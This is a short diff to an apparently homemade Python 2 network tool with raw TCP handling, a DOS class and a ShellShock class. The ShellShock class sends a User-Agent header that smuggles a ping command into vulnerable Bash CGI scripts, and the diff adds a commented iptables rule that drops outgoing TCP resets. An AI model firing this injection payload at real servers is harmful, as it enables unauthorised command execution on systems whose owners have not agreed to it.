@@ -1,6 +1,8 @@
 #! /usr/bin/env python
 # -*- coding: utf-8 -*-
 
+# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.0.10 -j DRO
+
 
 ## TODO:
 ##  - remplacer les sprintf de TCP.flags par des entiers
@@ -57,7 +59,7 @@ class DOS():
 # class Attack():
 
 class ShellShock():#Attack):
-    HTTP_HEADER = {"User-Agent":"() { :; }; ping -c 10 -p 5348454c4c5f53484f434b5f574f524b -s 24 "}
+    HTTP_HEADER = {"User-Agent":"() { :; }; ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
 
     def __init__(self, host, script_page, ping_ip):
         HTTP_HEADER['User-Agent'] += ping_ip
@@ -225,7 +227,7 @@ class HTTP():
                 # else: send(request, verbose=0)
 
             elif reply.sprintf('%TCP.flags%') == 'R':
-                if not 'data_frag' in self.get[page]: self.get[page]['data_frag'] = ''
+                # if not 'data_frag' in self.get[page]: self.get[page]['data_frag'] = ''
                 break
 
         # for i in self.get[page]['data_frag']:
@@ -259,7 +261,8 @@ if __name__ == "__main__":
     # html_rep = site.GET('groups/new.php')
     # html_rep = site.GET('index.nginx-debian.html')
     html_rep = site.GET('')
-    print site.getForms('')
+    for form in site.getForms(''):
+        print form
 
 
     if html_rep == None:
